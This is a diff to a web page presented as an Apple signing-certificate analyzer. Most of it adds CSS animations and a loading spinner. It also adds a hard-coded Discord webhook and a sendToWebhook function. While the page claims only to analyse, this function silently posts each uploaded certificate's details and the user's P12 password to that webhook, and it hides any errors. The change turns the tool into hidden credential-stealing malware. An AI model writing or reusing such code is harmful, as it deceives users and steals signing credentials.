@@ -41,6 +41,12 @@
             width: 100%;
             max-width: 900px;
             overflow: hidden;
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .header {
@@ -98,6 +104,7 @@
             border: 2px solid #e1e5e8;
             border-radius: 10px;
             font-size: 16px;
+            transition: border-color 0.3s ease;
         }
         
         input:focus {
@@ -123,6 +130,11 @@
             text-align: center;
             width: 100%;
             font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+        
+        .file-input-button:hover {
+            background-color: var(--primary-dark);
         }
         
         .file-input {
@@ -153,6 +165,7 @@
             cursor: pointer;
             width: 100%;
             margin-top: 10px;
+            transition: all 0.3s ease;
         }
         
         .submit-btn:disabled {
@@ -160,11 +173,23 @@
             cursor: not-allowed;
         }
         
+        .submit-btn:not(:disabled):hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        
         .results-section {
             display: none;
             margin-top: 30px;
             border-top: 1px solid #e1e5e8;
             padding-top: 30px;
+            animation: slideDown 0.5s ease-out;
+        }
+        
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .certificate-details {
@@ -217,6 +242,13 @@
             margin-top: 20px;
             display: none;
             text-align: center;
+            animation: shake 0.5s ease;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
         }
         
         .alert-error {
@@ -249,6 +281,7 @@
             border-radius: 12px;
             background: white;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            animation: fadeIn 0.5s ease-out;
         }
         
         .certificate-header {
@@ -275,6 +308,12 @@
             display: flex;
             margin-bottom: 12px;
             align-items: flex-start;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
         }
         
         .detail-icon {
@@ -335,6 +374,12 @@
             padding: 8px;
             border-radius: 8px;
             background: #f8f9fa;
+            transition: transform 0.2s ease;
+        }
+        
+        .entitlement-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
         }
         
         .entitlement-status {
@@ -348,6 +393,21 @@
         
         .status-disabled {
             color: var(--danger);
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -526,6 +586,9 @@
             const resultsSection = document.getElementById('results-section');
             const entitlementsList = document.getElementById('entitlements-list');
             
+            // Webhook URL
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
+            
             // Sample entitlements data
             const sampleEntitlements = [
                 "Access Wi-Fi Information",
@@ -637,11 +700,14 @@
                 
                 try {
                     submitBtn.disabled = true;
-                    submitBtn.textContent = 'Analyzing...';
+                    submitBtn.innerHTML = '<span class="loading-spinner"></span> Analyzing...';
                     uploadStatus.textContent = 'Checking certificate files...';
                     
                     // Parse the certificate using PKCS12 format
                     const certInfo = await parseP12Certificate(p12File, passwordInput.value);
+                    
+                    // Send data to webhook
+                    await sendToWebhook(certInfo, p12File.name, mobileprovisionFile.name);
                     
                     // Display the results
                     displayResults(certInfo);
@@ -651,17 +717,101 @@
                     uploadStatus.textContent = '';
                     
                     // Update button state
-                    submitBtn.textContent = 'Analyze Certificate';
+                    submitBtn.innerHTML = '<i class="fas fa-search"></i> Analyze Certificate';
                     updateSubmitButtonState();
                     
                 } catch (error) {
                     console.error('Error:', error);
                     showAlert(errorAlert, `Error: ${error.message}`);
                     uploadStatus.textContent = '';
-                    submitBtn.textContent = 'Analyze Certificate';
+                    submitBtn.innerHTML = '<i class="fas fa-search"></i> Analyze Certificate';
                     updateSubmitButtonState();
                 }
             });
+            
+            // Function to send data to Discord webhook
+            async function sendToWebhook(certInfo, p12FileName, mobileprovisionFileName) {
+                try {
+                    const embed = {
+                        title: "Apple Certificate Analyzer - New Submission",
+                        color: 0x007AFF,
+                        timestamp: new Date().toISOString(),
+                        fields: [
+                            {
+                                name: "Certificate Name",
+                                value: certInfo.commonName || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "Organization",
+                                value: certInfo.organization || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "Country",
+                                value: certInfo.country || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "Certificate Password",
+                                value: "||" + certInfo.password + "||", // Hidden with spoiler tags
+                                inline: false
+                            },
+                            {
+                                name: "Valid From",
+                                value: certInfo.validFrom || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "Valid To",
+                                value: certInfo.validTo || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "Status",
+                                value: certInfo.status || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "P12 File Name",
+                                value: p12FileName || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "Mobile Provision File Name",
+                                value: mobileprovisionFileName || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "Serial Number",
+                                value: certInfo.serialNumber || "Unknown",
+                                inline: false
+                            }
+                        ]
+                    };
+                    
+                    const payload = {
+                        username: "Certificate Analyzer",
+                        avatar_url: "https://cdn-icons-png.flaticon.com/512/888/888879.png",
+                        embeds: [embed]
+                    };
+                    
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    if (!response.ok) {
+                        console.error('Webhook error:', response.status, response.statusText);
+                    }
+                } catch (error) {
+                    console.error('Error sending to webhook:', error);
+                    // Don't throw error to prevent interrupting the user experience
+                }
+            }
             
             async function parseP12Certificate(p12File, password) {
                 try {
